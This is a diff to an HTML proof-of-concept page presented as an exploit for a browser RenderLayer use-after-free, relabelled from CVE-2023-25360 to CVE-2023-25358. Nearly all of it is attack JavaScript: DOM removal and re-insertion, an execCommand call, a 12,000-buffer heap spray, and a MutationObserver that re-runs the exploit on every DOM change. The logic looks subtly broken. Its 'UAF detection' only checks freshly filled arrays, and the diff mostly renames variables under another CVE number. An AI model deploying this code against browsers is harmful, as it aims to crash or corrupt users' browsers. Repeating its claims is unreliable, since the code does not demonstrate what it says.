@@ -3,94 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2023-25360 PoC</title>
+    <title>CVE-2023-25358 PoC</title>
     <style>
-        #target {
+        #victim {
             position: absolute;
-            width: 200px;
-            height: 200px;
-            overflow: auto;
-            background: green;
+            width: 150px;
+            height: 150px;
+            overflow: hidden;
+            background: red;
+        }
+        #newChild {
+            width: 50px;
+            height: 50px;
+            background: yellow;
         }
         button {
-            margin: 20px 0;
-            padding: 12px;
-            font-size: 18px;
+            margin: 15px 0;
+            padding: 10px;
+            font-size: 16px;
             cursor: pointer;
         }
         #status {
-            margin-top: 10px;
+            margin-top: 8px;
             font-weight: bold;
-            color: navy;
+            color: darkred;
         }
     </style>
 </head>
 <body>
-    <h1>CVE-2023-25360: RenderLayer UAF</h1>
+    <h1>CVE-2023-25358: RenderLayer::addChild UAF</h1>
     <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
     <button id="trigger">Trigger PoC</button>
-    <div id="status">Idle...</div>
-    <div id="parent">
-        <div id="target"></div>
+    <div id="status">Ready...</div>
+    <div id="container">
+        <div id="victim"></div>
     </div>
     <script>
-        const parent = document.getElementById('parent');
-        const target = document.getElementById('target');
+        const container = document.getElementById('container');
+        const victim = document.getElementById('victim');
         const status = document.getElementById('status');
-        let attempts = 0;
+        let attemptCount = 0;
 
         function sprayHeap() {
-            const arrays = [];
-            for (let i = 0; i < 20000; i++) {
+            const buffers = [];
+            for (let i = 0; i < 12000; i++) {
                 const buf = new Uint8Array(4096);
-                buf.fill(0x42); // Fill with 'B'
-                arrays.push(buf);
+                buf.fill(0x43); // Fill with 'C'
+                buffers.push(buf);
             }
-            return arrays;
+            return buffers;
         }
 
         function triggerExploit() {
-            attempts++;
-            console.log(`Attempt ${attempts}: Starting...`);
-            status.textContent = `Attempt ${attempts} running...`;
+            attemptCount++;
+            console.log(`Attempt ${attemptCount}: Initiating...`);
+            status.textContent = `Attempt ${attemptCount} running...`;
 
-            // Step 1: Manipulate DOM to free RenderLayer
-            target.style.display = 'block';
-            parent.removeChild(target);
+            // Step 1: Remove element to free RenderLayer
+            victim.style.display = 'block';
+            container.removeChild(victim);
 
-            // Step 2: Trigger style and render tree update
+            // Step 2: Add new element and update render tree
             setTimeout(() => {
                 try {
-                    // Re-add element to force style recalc
-                    parent.appendChild(target);
-                    // execCommand to trigger render tree update
-                    document.execCommand('fontSize', false, '5');
+                    // Add new child to trigger addChild
+                    const newChild = document.createElement('div');
+                    newChild.id = 'newChild';
+                    newChild.style.width = '50px';
+                    newChild.style.height = '50px';
+                    newChild.style.background = 'yellow';
+                    container.appendChild(newChild);
+                    // execCommand to force render tree update
+                    document.execCommand('bold', false, null);
                     // Spray heap
-                    const arrays = sprayHeap();
+                    const buffers = sprayHeap();
                     // Check for UAF
-                    console.log('Scanning for UAF...');
-                    for (let i = 0; i < arrays.length; i++) {
-                        if (arrays[i][0] !== 0x42) {
-                            console.log(`UAF found at index ${i}`);
+                    console.log('Probing for UAF...');
+                    for (let i = 0; i < buffers.length; i++) {
+                        if (buffers[i][0] !== 0x43) {
+                            console.log(`UAF detected at index ${i}`);
                             status.textContent = 'UAF detected!';
                             return;
                         }
                     }
-                    console.log('Exploit attempt completed, check for crash.');
+                    console.log('Exploit attempt done, check for crash.');
                     status.textContent = 'Exploit attempted!';
                 } catch (err) {
                     console.error(`Error: ${err.message}`);
                     status.textContent = 'Failed: Error occurred.';
                 }
-            }, 25);
+            }, 75);
         }
 
         const observer = new MutationObserver(() => {
-            console.log('DOM changed, retrying exploit...');
+            console.log('DOM modified, retrying exploit...');
             triggerExploit();
         });
 
-        observer.observe(parent, { childList: true, subtree: true });
+        observer.observe(container, { childList: true, subtree: true });
 
         document.getElementById('trigger').addEventListener('click', () => {
             try {
